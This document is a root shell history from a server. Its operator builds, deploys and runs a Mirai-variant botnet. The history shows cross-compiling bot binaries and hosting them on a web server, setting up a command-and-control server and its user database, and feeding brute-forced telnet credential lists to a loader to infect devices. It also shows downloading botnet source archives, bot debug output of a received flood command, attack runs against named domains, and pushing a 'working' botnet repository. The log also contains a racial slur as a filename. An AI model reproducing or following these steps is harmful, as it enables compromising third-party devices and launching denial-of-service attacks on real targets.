sh build_bot.sh 
cp binaries/* /var/www/html/bins
y
yclear
clear
sh build_bot.sh 
cd /var/www/html
ls
cd bins/
ls
rm *
y
ls
rm test_binaries.sh 
ls
cd boinker/cnc/
clear
ls
./cnc
ls
./cnc
cd boinker/loader/
ls
clear
./loader < bruted.txt 
cd ~/boinker/binaries/
./sora.x86 
dstat
ls
cd /
ls
cd /root
ls
cd boinker/
ls
cd cnc/
ls
./sora.x86 
cd ~/boinker/binaries/
./sora.x86 
ls
./sora.x86 
[DEBUG] STEP 1 ---> EXE
[DEBUG] ClearALLBuffer() function called successfully!
[DEBUG] CLEARED BUFFER -> EXE
[DEBUG] BUFFER REMADE -> EXE
[dbg / Clear Buffer] Clear Buffer Step 2 ---> COMM
[DEBUG] CLEARED BUFFER -> COMM
[DEBUG] BUFFER REOPEND --> COMM
[DEBUG] STEP 2 COMPLETE
[DEBUG] Step 3 Clear Buffer ---> CMDLINE
[DEBUG] CLEARED BUFFER -> CMDLINE
[DEBUG] BUFFER REOPEND --> CMDLINE
[DEBUG] STEP 3 COMPLETE
sp00ky scary skeletons
[ATTACK_INIT] Registering attack methods...
[ATTACK_INIT] Registered 11 attack methods
DEBUG: Entering main connection loop
[2025-09-29 20:58:32] [CONN] attempting to establish new connection (fd_serv=-1)
[2025-09-29 20:58:32] [CONN] attempting to connect to CNC
[2025-09-29 20:58:32] [CONN] connect() returned -1, errno=115, pending_connection=1
[2025-09-29 20:58:32] [CONN] connection in progress (EINPROGRESS)
[2025-09-29 20:58:32] [CONN] establish_connection() returned, fd_serv=4
[2025-09-29 20:58:32] [CONN] sending handshake to CNC (id_len=0)
[2025-09-29 20:58:32] [CONN] connected to CNC successfully
[2025-09-29 20:58:50] [CONN] received length field: 22 bytes
[2025-09-29 20:58:50] [CONN] received 22 bytes from CNC
[2025-09-29 20:58:50] [CONN] Buffer content (first 16 bytes): 00 00 00 14 09 01 01 01 01 01 20 02 07 02 32 32 
[MAIN] Calling attack_parse with 22 bytes
[MAIN] About to call attack_parse...
[ATTACK_PARSE] FUNCTION CALLED!
[ATTACK_PARSE] === START ===
[ATTACK_PARSE] Received buffer length: 22 bytes
[ATTACK_PARSE] Buffer content (first 32 bytes): 00 00 00 14 09 01 01 01 01 01 20 02 07 02 32 32 00 02 32 32 32 32 
[ATTACK_PARSE] Duration: 20 seconds
[ATTACK_PARSE] Attack vector: 9
[ATTACK_PARSE] Number of targets: 1
[ATTACK_PARSE] Number of options: 2
[ATTACK_PARSE] === ATTACK_PARSE COMPLETE ===
[ATTACK_PARSE] Calling attack_start()...
[ATTACK_PARSE] attack_start() returned
[MAIN] attack_parse returned
clear
cd ..
cd binaries/
./sora.x86 
tail -f /var/log/httpd/access_log 
cat /tmp/bot_debug.log 
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
ip a
185.247.117.214ysql -u root -e "CREATE DATABASE cosmic; USE cosmic; CREATE TABLE \`history\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`user_id\` int(10) unsigned NOT NULL, \`time_sent\` int(10) unsigned NOT NULL, \`duration\` int(10) unsigned NOT NULL, \`command\` text NOT NULL, \`max_bots\` int(11) DEFAULT '-1', PRIMARY KEY (\`id\`), KEY \`user_id\` (\`user_id\`)); CREATE TABLE \`users\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`username\` varchar(32) NOT NULL, \`password\` varchar(32) NOT NULL, \`duration_limit\` int(10) unsigned DEFAULT NULL, \`cooldown\` int(10) unsigned NOT NULL, \`wrc\` int(10) unsigned DEFAULT NULL, \`last_paid\` int(10) unsigned NOT NULL, \`max_bots\` int(11) DEFAULT '-1', \`admin\` int(10) unsigned DEFAULT '0', \`RemoveUser\` bigint(20) NOT NULL, \`intvl\` int(10) unsigned DEFAULT '30', \`api_key\` text, PRIMARY KEY (\`id\`), KEY \`username\` (\`username\`)); CREATE TABLE \`whitelist\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`prefix\` varchar(16) DEFAULT NULL, \`netmask\` tinyint(3) unsigned DEFAULT NULL, PRIMARY KEY (\`id\`), KEY \`prefix\` (\`prefix\`)); INSERT INTO users VALUES (NULL, 'divine', 'daddy', 0, 0, 0, 0, -1, 1, 30, ''); INSERT INTO users VALUES (NULL, 'grace', 'synfloods', 0, 0, 0, 0, -1, 1, 30, '');"
ysql -u root -e "CREATE DATABASE cosmic; USE cosmic; CREATE TABLE \`history\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`user_id\` int(10) unsigned NOT NULL, \`time_sent\` int(10) unsigned NOT NULL, \`duration\` int(10) unsigned NOT NULL, \`command\` text NOT NULL, \`max_bots\` int(11) DEFAULT '-1', PRIMARY KEY (\`id\`), KEY \`user_id\` (\`user_id\`)); CREATE TABLE \`users\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`username\` varchar(32) NOT NULL, \`password\` varchar(32) NOT NULL, \`duration_limit\` int(10) unsigned DEFAULT NULL, \`cooldown\` int(10) unsigned NOT NULL, \`wrc\` int(10) unsigned DEFAULT NULL, \`last_paid\` int(10) unsigned NOT NULL, \`max_bots\` int(11) DEFAULT '-1', \`admin\` int(10) unsigned DEFAULT '0', \`RemoveUser\` bigint(20) NOT NULL, \`intvl\` int(10) unsigned DEFAULT '30', \`api_key\` text, PRIMARY KEY (\`id\`), KEY \`username\` (\`username\`)); CREATE TABLE \`whitelist\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`prefix\` varchar(16) DEFAULT NULL, \`netmask\` tinyint(3) unsigned DEFAULT NULL, PRIMARY KEY (\`id\`), KEY \`prefix\` (\`prefix\`)); INSERT INTO users VALUES (NULL, 'divine', 'daddy', 0, 0, 0, 0, -1, 1, 30, ''); INSERT INTO users VALUES (NULL, 'grace', 'synfloods', 0, 0, 0, 0, -1, 1, 30, '');"
mysql -u root -e "CREATE DATABASE cosmic; USE cosmic; CREATE TABLE \`history\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`user_id\` int(10) unsigned NOT NULL, \`time_sent\` int(10) unsigned NOT NULL, \`duration\` int(10) unsigned NOT NULL, \`command\` text NOT NULL, \`max_bots\` int(11) DEFAULT '-1', PRIMARY KEY (\`id\`), KEY \`user_id\` (\`user_id\`)); CREATE TABLE \`users\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`username\` varchar(32) NOT NULL, \`password\` varchar(32) NOT NULL, \`duration_limit\` int(10) unsigned DEFAULT NULL, \`cooldown\` int(10) unsigned NOT NULL, \`wrc\` int(10) unsigned DEFAULT NULL, \`last_paid\` int(10) unsigned NOT NULL, \`max_bots\` int(11) DEFAULT '-1', \`admin\` int(10) unsigned DEFAULT '0', \`RemoveUser\` bigint(20) NOT NULL, \`intvl\` int(10) unsigned DEFAULT '30', \`api_key\` text, PRIMARY KEY (\`id\`), KEY \`username\` (\`username\`)); CREATE TABLE \`whitelist\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`prefix\` varchar(16) DEFAULT NULL, \`netmask\` tinyint(3) unsigned DEFAULT NULL, PRIMARY KEY (\`id\`), KEY \`prefix\` (\`prefix\`)); INSERT INTO users VALUES (NULL, 'divine', 'daddy', 0, 0, 0, 0, -1, 1, 30, ''); INSERT INTO users VALUES (NULL, 'grace', 'synfloods', 0, 0, 0, 0, -1, 1, 30, '');"
NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `RemoveUser` bigint(20) NOT NULL,
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
INSERT INTO users VALUES (NULL, 'divine', 'daddy', 0, 0, 0, 0, -1, 1, 30, '');
INSERT INTO users VALUES (NULL, 'grace', 'synfloods', 0, 0, 0, 0, -1, 1, 30, '');
exit;mtsql
cd Divine/
mysql -p
mysql 
CREATE DATABASE cosmic;
use cosmic;
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `RemoveUser` bigint(20) NOT NULL,
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
INSERT INTO users VALUES (NULL, 'divine', 'daddy', 0, 0, 0, 0, -1, 1, 30, '');
INSERT INTO users VALUES (NULL, 'grace', 'synfloods', 0, 0, 0, 0, -1, 1, 30, '');
exit;
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
mysql
rm -rf *
ls
clear
ls -a
rm .cursor
rm -rf .cursor
rm -rf .cache/ .config/ .cursor-server/
clear
ls
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
ls
mv backup/bot/ .
mv backup/cnc/ .
mv backup/cnc/ ./cnc
rm cnc
mv backup/cnc/ ./cnc
cd cnc
ls
cd ..
cd backup/
ls
mv build.sh ../
cd ..
mysql
clear
sh build.sh 
cd /etc/xcompile
ls
cd arc/
ls
cd bin/
ls
cd arc-linux-gcc 
ls
cd arc-linux-gcc 
cd ../
cd ..
cd /etc/xcompiler
ls
cd armv4l/
ls
cd ..
cd ~/
sh build.sh 
clear
ls
cd loader/
clear
./loader
./loader < telnet.txt 
cat telnet.txt | ./loader 
./loader_debug < telnet.txt 
reboot
clear
ls
ip a
ls
nano cnc_main.go 
clear
pkill -f cnc
celar
clear
ls
./cnc
mkdir backup
cd backup
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip
ls
yum install unzip
unzip x Divine\ Mirai\ Variant.zip 
unzip Divine\ Mirai\ Variant.zip 
clear
cd /var/www/html
ls
cd bins/
ls
cd ..
ls
cd ~?
cd ~/
clear
ls
cd cnc
clear
sl
ls
./cnc
pkill -f cnc
clear
./cnc
mysql
./cnc
cd /root && file cnc/cnc && ./cnc/cnc --help 2>/dev/null || echo "CNC binary created successfully (no help flag available)"
clear
ls
rm cnc
cd cnc
rm cnc
cd /root && go build -o cnc cnc/*.go
./cnc
ls
cd cnc
ls
./cnc
clear
ls
cd ..
ls
./cnc
cd /root && go build -o server cnc/*.go
ls
./server 
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cd loader/
./loader_debug < telnet.txt 
./loader_debug_fixed < telnet.txt 
cd /var/www/htlml
cd /var/www/html/bins
ls
nano index.html 
clear
cd ~
cd ~/
clear
sl
cd ..
cd ~/
ls
rm -rf *
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
tail -f /var/log/httpd/access_log 
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
clear
ls
sh build.sh
clear
cd /var/www/html/bins
ls
cd ~/
mkdir backup
mv Divine\ Mirai\ Variant.zip backip
ls
cd backip
rm backip 
clear
cd backup
wget https://github.com/R00tS3c/DDOS-RootSec/blob/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip 
s
ls
unzip Divine\ Mirai\ Variant.zip && rm Divine\ Mirai\ Variant.zip 
unzip Divine\ Mirai\ Variant.zip &
unzip Divine\ Mirai\ Variant.zip 
ls
wget https://github.com/R00tS3c/DDOS-RootSec/blob/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip -o mirai.zip
ls
unzip mirai.zip 
clear
rm *
ls
wget https://github.com/R00tS3c/DDOS-RootSec/blob/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip -o mirai.zip
unzip mirai.zip 
clear
ls
rm *
ls
cd ..
ls
cd backup
ls
rm -rf *
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip
unzip Divine\ Mirai\ Variant.zip 
clear
cd /var/www/html/bins
ls
cd ~/release/
ls
cd ..
ls
sh build.sh 
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
clear
sh build.sh 
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cd /var/www/html/bins
ls
cd cnc
cd ..
./server 
tail -f /var/log/httpd/access_log 
cd /var/www/html/bins/ls
cd /var/www/html/bins/
ls
cd ..
ls
clear
cd ~/.ssh
ssh-keygen
cd ~/.ssh
ls
nano id_rsa
nano id_rsa.pub 
nano aaa
cd ~/
clear
ls
cd loader/
celar
cls
lear
clear
ls
./c
./cnc
screen -dmS admin./cnc
screen -dmS admin ./cnc
screen -r
nano t.txt
clear
./loader < t.txt 
./loader_debug_fixed < t.txt 
nano aa.txt
./loader_debug_fixed < aa.txt 
cd ..
ls
rm upx.*
rm upx*
y
clear
ls
cd loader/
nano tt.txt
./loader_debug_fixed < tt.txt 
./loader< tt.txt 
nano tt.txt 
./loader< tt.txt 
nano logemin.txt
./loader< tt.txt 
./loader_debug < tt.txt 
./loader_debug_fixed < tt.txt 
cd ..
git clone https://github.com/Thatdevnerd/cronical cron
cd lo
ls
cd loader
clear
ls
rm loader
cd /root/loader/src && gcc -o ../loader -std=c99 -D_GNU_SOURCE -O2 -Wall -Wextra -Werror -static main.c binary.c connection.c server.c telnet_info.c util.c -lpthread
clear
git clone https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip .
git clone https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip divine
git clone https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip di
git clone https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip 
ls
rm -rf Divine
ls
cd ..
ls
cd ..
ls
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip 
ls
unzio Divine\ Mirai\ Variant.zip 
unzip Divine\ Mirai\ Variant.zip 
y
yclear
clear
ls
unzip Divine\ Mirai\ Variant.zip 
clear
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip
unzip Divine\ Mirai\ Variant.zip 
ls
ls -a
rm -rf .cursor.cursor
ip a
clear
ls
mkdir release
ls
cd release/
ls
cd /
sh build.sh
ls
cd /
sh build.sh
cd ~/
sh build.sh 
rm -rf /etc/xcompile
rm -rf /etc/xcompilr
clear
cd loader/bins
rm * -f
ls
cd ..
cd ~/release
ls
rm * -f
cd ..
sh build.sh clear
ls
cd release/
ls
cd .
cd ..
sh build.sh 
clear
cd /var/html/bins
cd /var/www/html/bins
clear
ls
rm * .
rm * . -f
rm -f * . -f
rm -rf * . -f
ls
cd ..
ls
cd ~/
clear
sh build.sh 
clear
ls
clear
cd ~/release/
ls
cd /var/www/html/bins
ls
./static.x86 
htop
clear
ls
cd ..
cd ~/
clear
ls
sh build.sh 
cd ~/release/
ls
cd .
cd ..
sh build.sh 
ls
cd release/
ls
./static.x86 
/var/www/html
ls
cd /var/www/html
ls
cd bins/
ls
pwd
rm * -f
ls
pwd
ls
cd ..
ls
cd bins/
ls
./static.x86 
ls
rm -rf *
ls
ls =a
ls -a
rm -rf .cache .cursor .cshrc .cursor-server/.git .gitconfig .mysql_history .pki/ .tcshrc .viminfo 
ls
ls -a
rm -rf .cursor-server/
ls -a
ip a
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/Divine%20Mirai%20Variant.zip
clear
unzip Divine\ Mirai\ Variant.zip 
clear
ip a
git clone https://github.com/Thatdevnerd/boinknet.git X
clear
cd x
cd X
clear
ls
cd xcompile-backup/
clear
ls
mkdir /etc/xcompiler
mv /etc/xcompiler
rm /etc/xcompiler
rm -rf /etc/xcompiler
clear
mkdir /etc/xcompiler
mv * /etc/xcompiler
cd /etc/xcompiler/
ls
chmod 777 *
ls
cd ~/
clear
sh build.sh 
ls
cd release/
ls
cd /var/www/html/bins/
ls
cd ~/cnc
ls
./admin 
pkill -f cnc
./admin 
cd ~/
cd /var/www/html/bins
ls
./static.arm
./static.x86 
ls
cd ~/
sh build.sh 
cd /var/www/html
cd bins/
ls
./static.x86 
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
ip a
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
clear
ls
cd 
htop
cd cnc/
pkill -f cnc
pkill -f admin
ls
./admin 
ip a
cd cnc/
pkill -f admin
pkill -f cnc
./admin 
reboot
dstat
clear
ls
cd release/
ls
./attack.debug 
./attack.debug -d bigbomboclaat.corestresser.cc
./attack.debug 
ls
cd release/
ls
./selfrep.debug 
dstat
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cd release/
rm * -f
ls
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
clear
cd loader/
touch list.txt
nano list.txt
./loader < list.txt 
ip a
cd ..
cd release/
ls
rm * -f
cd ..
sh build.sh 
cd loader/
clear
ls
./loader list.txt 
./loader < list.txt 
ls
cat list.txt | grep 112.28.79.69
cat list.txt | grep 172.236.150.6
cd cnc/
./admin 
cd dlr/
nano main.c 
tail -f /var/log/httpd/access_log 
cd loader/
cat list.txt | grep 85.248.223.2
reboot
cd release/
rm * -f
cd ..
sh clear
clear
ls
cd release/
ls
cd ..
sh build.sh 
git init
echo "# divine-botnet-working" >> README.md
git init
git add README.md
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/Thatdevnerd/divine-botnet-working.git
git push -u origin main
git config --global user.email "bas@bitsenbytes.org"
git config --global user.name "thatdevnerd"
git add -A
git commit -m "working"
git push
echo "# divine-botnet-working" >> README.md
git init
git add README.md
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/Thatdevnerd/divine-botnet-working.git
git push -u origin main
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cd cnc
./admin
dstat
htop
cd loader/
nano brute.txt
./loader < brute.txt 
tail -f /var/log/httpd/access_log 
cd cnc
clear
screen -dmS ./admin
screen -dmS cnc ./admin
screen -r cnc
cd loader/
nano big.txt
./loader < big.txt 
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
screen -r cnc
ls
cd cnc
ls
cd ..
cd loader/
s;
;s
ls
sh start_scanlisten.sh 
nano start_scanlisten.sh 
./scanListen 
ls
rm list_*
rm list_-f
rm list_* -f
clear
ls
rm telnet_* -f
ls
cd ..
cd release/
s
ls
cd /var/www/html/bins
ls
clear
ls
cd ~/
cd loo
cd loader/
clear
ls
./scanListen_debug < big.txt 
./loader < big.txt 
ls
./loader
clear
ls
./scanListen < big.txt 
nano debug_
nano debug_20251001_053601.log 
htop
clear
./loader
./loader < big.txt 
ls
cd loader 
ls
rm big_* -f
ls
rm debug_* -f
ls
rm monitor_cnc_connections.sh optimize_scanlisten.sh fix_cnc_connection.sh improved_optimize.sh test_cnc_server.py test_debug.sh -f
ls
rm success_* -f
ls
rm simple_cnc_server.py scanListen_fixed start_debug_loader.sh start_debug -f
ls
rm scan* -f
ls
rm enhanced_clean.txt enhanced_targets.txt 
ls
clear
./loader
./loader < big.txt 
ls
cd ..
clear
cd cnc/
./admin 
screen -dmS cnc ./admin 
screen -r
tail -f /tmp/execution_tracking.log 
clear
clear
ls
clear
tail -f /var/log/httpd/access_log 
clear
tail -f /var/log/httpd/access_log 
clear
cd /var/www/html/bins
clea
rls
tail -f /var/log/httpd/access_log 
clar
clear
ls
cd ..
cd /root
mkdir cyka
ls
cd cyka/
ls
clear
ls
wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/%5BMIRAI%5D%20Cyka.zip
unzip \[MIRAI\]\ Cyka.zip 
ls
cd \[MIRAI\]\ Cyka
cler
clear
tail -f /var/log/httpd/access_log 
cd ~/loader/
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cd loader
ls
./laoder < big.txt
ls
clear
./loader < big.txt 
screen -r cnc
screen -r
sh build.sh 
./loader < big.txt 
sh build.sh 
clear
sh build.sh 
./loader < big.txt 
sh build.sh 
./loader < big.txt 
sh build.sh 
clear
./loader < big.txt 
screen -r
cd ~/cnc
./admin 
pkill -f admin
./admin 
screen -r
pkill -f admin
clear
screen -r
./admin 
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cnc
cd cnc
clear
./admin
tail -f /var/log/httpd/access_log 
clear
ls
clear
ls
cd /var/www/html
ls
nano nigger.sh 
tail -f /var/log/httpd/access_log 
cd loader/
nano bruted.txt 
./loader < bruted.txt 
mv /var/www/html/nigger.sh ~/
systemctl status firewalld
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cd loader/
nano aa.txt
./loader <aa.txt 
ip a
ls
nano list.txt 
./loader < list.txt 
htop
./loader < list.txt 
reboot
clear
cd ./loader/
./loader
cd /var/www/html/bins
ls
rm * -f
ls
cd /root
sh build.sh 
ls
./upx
clear
sh build.sh 
mv nigger.sh /var/www/html/bins/binsh.sh
cd /var/www/html/bins/bins.sh
cd /var/www/html/bins
nano binsh.sh 
ls
nano binsh.sh 
clear
cd binsh.sh ~/
ls
mv binsh.sh bins.sh
cp bins.sh ~/
nano bins.sh 
~/
clear
cd ~?
cd ~/
clear
ls
cd lo
cd loader/
python loader.py 
python loader.py bruted.txt 
nano bots.txt 
python loader.py bruted.txt 
. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cd cnc
./admin 
ls
./cnc_server 
screen -dmS CNC ./cnc_server 
screen -r CNC
. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
cd cnc/
screen -dmS CNC ./cnc_server 
screen -r CNC
cd loader/
./loader < list.txt 
ls
nano list.txt 
./loader < list.txt 
systemctl status httpd
systemctl status firewalld
. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
clear
ls
sh build.sh 
. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
git add -A
git commit -m "improved cnc, improved bot"
git push
screen -r
mysql
ip a
cd loader/
touch ga.txt
nano ga.txt 
./loader < ga.txt 
ls
python telnet_scanner.py 
python loader.py ga.txt 
ls
sh build.sh 
cd s
cd src
ls
./loader < ga.txt 
cd ~/loader
clear
touch ga.txt
nano ga.txt 
./loader < ga.txt 
ls
cd bins
ls
./loader < ga.txt 
c ~/loader
cd ~/loader
clear
sh build.sh 
./loader < ga.txt 
cd ~/cmc
cd ~/cnc
clear
./cnc_server 
htop
pkill -9 python
htop
pkill -f cnc_server
screen -dmS cnc ./cnc_server 
screen -r
htoop
htop
./cnc_server 
pkill -f cnc_server
pkill -f admin
./cnc_server 
./cnc_server [SUCCESS] IP resolved successfully: famoosterlee.nl -> 84.241.177.149
Session Has Been Killed!
panic: runtime error: slice bounds out of range [12:4]
goroutine 15 [running]:
main.NewAttack({0xc0000261c0, 0x3f}, 0x1)
        /root/cnc/attack.go:303 +0x1376
main.(*Admin).Handle(0xc0000160b0)
        /root/cnc/admin.go:535 +0x5535
main.initialHandler({0x6e3478?, 0xc00003e060})
        /root/cnc/main.go:130 +0xa3e
created by main.main.func1 in goroutine 24
        /root/cnc/main.go:40 +0x2f
screen -dmS cnc ./cnc_server 
screen 0r
screen -r
screen -r cnc
pkill -9 screen
screen -wipe
screen -dmS cnc ./cnc_server 
screen -r
. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
clera
ls
sh build.sh 
. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
